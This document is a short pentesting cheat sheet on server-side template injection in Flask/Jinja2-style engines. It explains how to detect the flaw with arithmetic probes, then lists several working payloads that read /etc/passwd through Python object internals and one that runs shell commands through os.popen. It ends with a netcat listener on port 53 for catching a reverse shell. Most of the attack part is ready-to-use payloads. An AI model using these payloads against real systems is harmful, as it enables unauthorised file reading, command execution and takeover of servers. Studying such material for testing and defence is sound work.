# Server Site Template Injection

Take advantage of a engine of templates (this are used to represent dynamic data).

This type of attack point to the server to see internal files or sometimes an [[RCE]]

- If the attack is in the side of the client this is consider a [[CSTI]] attack

----

# How to identify this

The first of all, if you see that is using some engine of templates like **flask** or is being used python you can try to put this in some field:

> {{7\*7}} 

If in the **response show the result** this meaning that is **vulnerable**

You have to try a lot of payloads until you find the right one

Or you can say the number seven represent me seven times:

> {{'7'\*7}}



---

# Read remote files from victim machines

Remember not always work the same way, you have to try different

1. 

````python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
````

2.

````python
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}
````

3.

````python
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
````


----

# Execute commands

Normally the command that work most of the time

````python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
````

Now you can gain access to the victim machine, using in our attacker machine:

> nc -nlvp 53

----

# extra sources

Remember that you can use [Payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) specifically the section of SSTI

---

# Tags

#ssti #vulnerabilty 

---
